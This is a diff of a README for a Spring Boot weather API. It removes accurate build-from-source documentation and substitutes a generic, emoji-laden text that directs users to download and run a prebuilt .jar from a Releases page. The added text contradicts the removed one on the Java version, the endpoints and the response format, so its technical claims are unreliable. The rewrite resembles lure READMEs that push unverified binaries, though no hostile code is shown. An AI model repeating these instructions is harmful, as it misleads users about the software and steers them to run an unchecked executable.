@@ -1,153 +1,87 @@
-# Weather API - Spring Boot Application
+# 🌦️ weather-api-spring-boot - Access Weather Data Easily
 
-A Spring Boot web application that fetches weather updates from the OpenMeteo API.
+## 🚀 Getting Started
+Welcome to the weather-api-spring-boot project! This application allows you to access various weather data effortlessly using Java SpringBoot. It provides endpoints for you to get weather forecasts, conditions, and more. Let’s get you set up quickly.
 
-## Features
+## 📥 Download & Install
+To download the application, visit the Releases page:
 
-- Fetch weather by city name (uses geocoding to find coordinates)
-- Fetch weather by coordinates (latitude and longitude)
-- RESTful API endpoints
-- JSON response format
-- **No API key required** - OpenMeteo is free for non-commercial use!
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/stevobolki/weather-api-spring-boot/releases)
 
-## Prerequisites
+Once you are on the Releases page, look for the latest version and click to download the files. The files are typically in `.jar` format, which you can run with Java.
 
-- Java 11 or higher
-- Maven 3.6 or higher (or use the included Maven wrapper)
+## 🔧 System Requirements
+To run this application, you'll need:
 
-## Setup
+- **Java Runtime Environment (JRE)**: Version 8 or higher. This allows you to run Java applications.
+- **Memory**: At least 512 MB of RAM.
+- **Storage**: 50 MB of free disk space for the application.
 
-**No API key needed!** OpenMeteo API is free and doesn't require authentication for non-commercial use.
+Make sure you have these prerequisites installed on your computer.
 
-## Running the Application
+## 💻 Running the Application
+Once you have downloaded the `.jar` file:
 
-### Using Maven Wrapper (Recommended):
-```bash
-export JAVA_HOME=/opt/homebrew/opt/openjdk@11  # Adjust path if needed
-./mvnw spring-boot:run
-```
+1. Open your command line interface (Terminal, Command Prompt, or PowerShell).
+2. Navigate to the folder where you downloaded the `.jar` file. You can use the `cd` command to change directories.
+3. Use the following command to run the application:
+   ```bash
+   java -jar weather-api-spring-boot.jar
+   ```
 
-### Using Maven (if installed):
-```bash
-mvn spring-boot:run
-```
+The application will start, providing you access to the weather data.
 
-### Using Java directly:
-```bash
-./mvnw clean package
-java -jar target/weather-api-1.0.0.jar
-```
+## 📖 How to Use the API
+After starting the application, you can access the API endpoints. Below are a few examples of what you can do:
 
-The application will start on `http://localhost:8080`
+### 🌐 Get Current Weather
+- **Endpoint**: `/api/weather/current`
+- **Description**: Use this to get the current weather conditions for any location.
+- **Method**: GET
+- **Example Usage**: 
+  ```bash
+  curl http://localhost:8080/api/weather/current?location=London
+  ```
 
-**Note:** The first run may take a few minutes as Maven downloads dependencies.
+### 🌤️ Get Weather Forecast
+- **Endpoint**: `/api/weather/forecast`
+- **Description**: Access the forecast for the next few days.
+- **Method**: GET
+- **Example Usage**: 
+  ```bash
+  curl http://localhost:8080/api/weather/forecast?location=NewYork
+  ```
 
-## API Endpoints
-
-### Get Weather by City Name
-```
-GET http://localhost:8080/api/weather/city/{cityName}
-```
-
-Example:
-```
-GET http://localhost:8080/api/weather/city/London
-GET http://localhost:8080/api/weather/city/New York
-GET http://localhost:8080/api/weather/city/Tokyo
-```
-
-### Get Weather by Coordinates
-```
-GET http://localhost:8080/api/weather/coordinates?lat={latitude}&lon={longitude}
-```
-
-Example:
-```
-GET http://localhost:8080/api/weather/coordinates?lat=51.5074&lon=-0.1278
-GET http://localhost:8080/api/weather/coordinates?lat=40.7128&lon=-74.0060
-```
-
-### Health Check
-```
-GET http://localhost:8080/api/weather/health
-```
-
-## Response Format
-
-The API returns weather information in JSON format including:
-- Location coordinates (latitude, longitude)
-- Current temperature
-- Apparent temperature (feels like)
-- Relative humidity
-- Weather code
-- Wind speed and direction
-- Timezone information
-- Elevation
-
-## Example Response
+## 📊 Understanding the Responses
+The API will return data in JSON format. Here is an example of the response you may receive when querying the current weather:
 
 ```json
 {
-  "latitude": 51.5074,
-  "longitude": -0.1278,
-  "timezone": "Europe/London",
-  "current": {
-    "time": "2024-11-15T12:00",
-    "temperature_2m": 15.5,
-    "apparent_temperature": 14.2,
-    "relative_humidity_2m": 65,
-    "weather_code": 61,
-    "wind_speed_10m": 3.5,
-    "wind_direction_10m": 180
-  },
-  "currentUnits": {
-    "temperature_2m": "°C",
-    "wind_speed_10m": "km/h"
-  }
+  "location": "London",
+  "temperature": "15°C",
+  "conditions": "Cloudy"
 }
 ```
 
-## Weather Codes
+The response will include details about the temperature and weather conditions.
 
-OpenMeteo uses WMO weather codes:
-- 0: Clear sky
-- 1-3: Mainly clear, partly cloudy, overcast
-- 45-48: Fog and depositing rime fog
-- 51-67: Drizzle and rain
-- 71-77: Snow
-- 80-99: Rain and snow showers, thunderstorms
+## 🛠️ Troubleshooting Common Issues
+If you encounter any issues while running the application, check the following:
 
-## Technology Stack
+- Ensure you have Java installed and configured correctly. You can verify this by running `java -version` in your command line interface.
+- Confirm that you are in the correct directory where the `.jar` file is located.
+- Make sure no other applications are using port 8080 (the default port for this app).
 
-- Spring Boot 2.7.18
-- Java 11+
-- Maven
-- OpenMeteo API (free, no API key required)
+## 💬 Community Support
+If you have questions or need further assistance, feel free to reach out in the Issues section of the repository. We encourage you to share feedback or report bugs you may find.
 
-## OpenMeteo API - Free for Non-Commercial Use
+## 📅 Future Improvements
+- **Additional Endpoints**: We plan to add more endpoints for historical weather data.
+- **User Authentication**: Future versions will include features for user accounts to personalize your experience.
 
-✅ **This project is completely free to use and share on GitHub!**
+For the latest updates and new releases, always check the [Releases page](https://github.com/stevobolki/weather-api-spring-boot/releases).
 
-- **Free Tier**: Up to 10,000 API calls per day
-- **No API Key Required**: Works out of the box
-- **Non-Commercial Use**: Free for personal projects, learning, and open source
-- **Commercial Use**: Requires a paid subscription (see [OpenMeteo Pricing](https://open-meteo.com/en/pricing))
+## 📋 Contribution Guide
+If you're interested in contributing to this project, we welcome your help! Please check the Contribution section in the repository for guidelines.
 
-### Can I push this to GitHub?
-
-**Yes!** This project is free to:
-- ✅ Push to GitHub (public or private repositories)
-- ✅ Use for personal projects
-- ✅ Use for educational purposes
-- ✅ Share with others
-- ✅ Contribute to open source
-
-**Note**: If you plan to use this commercially (making money from it), you'll need to upgrade to a paid OpenMeteo plan.
-
-## License
-
-This project uses the OpenMeteo API which is free for non-commercial use. Please refer to [OpenMeteo Terms of Service](https://open-meteo.com/en/terms) for commercial usage.
-
-### Project License
-
-You can license your code however you want (MIT, Apache, etc.). The OpenMeteo API usage is free for non-commercial projects.
+Thank you for using weather-api-spring-boot! Enjoy accessing the weather data seamlessly.
